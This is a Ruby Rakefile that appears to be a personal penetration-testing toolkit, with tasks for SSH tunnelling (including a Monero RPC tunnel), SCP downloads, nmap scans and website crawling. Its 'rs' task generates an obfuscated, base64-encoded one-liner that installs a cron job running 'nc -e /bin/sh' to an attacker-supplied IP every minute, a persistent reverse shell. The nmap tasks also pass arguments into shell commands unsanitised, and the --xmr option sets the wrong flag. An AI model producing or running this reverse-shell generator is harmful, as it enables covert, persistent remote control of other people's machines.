require 'rake'
require 'json'
require 'net/scp'
require 'base64'
require 'socket'
require 'spidr'
require 'optparse'
class Config
    def initialize(file: "config.json", ssh: "cowrie")
      @file = file
      @ssh  = ssh
        if File.exist?(@file)
          j = JSON.parse(File.read(@file).to_s)
          if j.has_key?(@ssh)
            @json = j[@ssh]
          end
        end
    end
    def ip
      @json["ip"]
    end
    def uname
      @json["uname"]
    end
    def pass
      @json["pass"]
    end
    def port
      @json["port"]
    end
    def key
      @json["keys"]
    end
end
def ssh_tunnel_forward(ssh, args)
  require 'net/ssh'
  c      = Config.new(ssh: ssh)
  Net::SSH.start(c.ip, c.uname, :password => c.pass, :keys => c.key) do |ssh|
    ssh.forward.local(args.lip, args.lport, args.rip, args.rport)
    puts "[+] Starting SSH forward tunnel"
    ssh.loop { true }
  end
end
desc "Monero rpc tunnel"
task :xmr, [:lip, :lport,  :rip, :rport, :ssh] do |t, args|
  args.with_defaults(:ssh => "xmr", :lip => "127.0.0.1", :lport => 3334, :rip => "127.0.0.1", :rport => 18089)
  ssh_tunnel_forward(args.ssh, args)
end
desc "SCP files"
task :scp, [:file_name, :download_path, :ssh] do |t, args|
  args.with_defaults(:ssh => "cowrie")
  c      = Config.new(ssh: args.ssh)
  Net::SSH.start(c.ip, c.uname, :password => c.pass, :port => c.port, :keys => c.key) do |ssh|
    ssh.scp.download! args.file_name, args.download_path
  end
end
desc "Nmap -sV scan"
task :sv, [:ip, :fn] do |t,args|
  args.with_defaults(:fn => "list_scan.txt")
  %x[ nmap -sV #{args.ip} -oN #{args.fn} ]
end
desc "Nmap -sU scan (UDP)"
task :udp, [:ip, :fn] do |t, args|
  args.with_defaults(:fn => "upd_scan.txt")
  %x[ nmap -sU #{args.ip} -oN #{args.fn} ]
end
desc "Reverse Shell"
task :rs, [:ip, :port] do |t, args|
   c = %Q{#!/bin/bash
        line="* * * * * nc -e /bin/sh #{args.ip} #{args.port}"
        (crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}
  puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
end
desc "Spider crawl a website"
task :crawl, [:site] do |t, args|
  puts args.site
  urls = []
  Spidr.site(args.site, max_depth: 7 ) do |spider|
    spider.every_url { |u| urls << u }
  end
File.open("#{args.site.gsub("https://", "").gsub("/", "")}-crawl.txt", "a") {|f| f.write(urls.join("\n")) }
end
desc "removes any .txt files"
task :clean do |t|
  Dir.glob("**/*.txt") do |i|
    File.delete(i) if File.exist?(i)
  end
end
options = {}
OptionParser.new do |parser|
  parser.on("--clean", "Remove any .txt files in the current directory.") do |a|
    options[:clean] = true
  end
  parser.on("--port [PORT]", "Used for ports. ( --rs )") do |b|
    options[:port]   = b
  end
  parser.on("--rs [RS]", "Reverse Shell generator") do |b|
    options[:rs]   = b
  end
  parser.on("--crawl [CRAWL]", "Crawl a website and save all the links in a text file") do |b|
    options[:crawl] = b
  end
  parser.on("--sv [SV]", "Performs a nmap scan with -sV flags") do |b|
    options[:sv] = b
  end
  parser.on("--xmr", "Monero RPC Tunnel") do |b|
    options[:sv] = b
  end
end.parse!
if options[:clean]
  Rake::Task['clean'].invoke
end
if options[:rs]
  Rake::Task['rs'].invoke(options[:rs], options[:port])
end
if !options[:crawl].nil?
  Rake::Task['crawl'].invoke(options[:crawl])
end
if !options[:sv].nil?
  Rake::Task['sv'].invoke(options[:sv])
end
if !options[:xmr].nil?
  Rake::Task['xmr'].invoke
end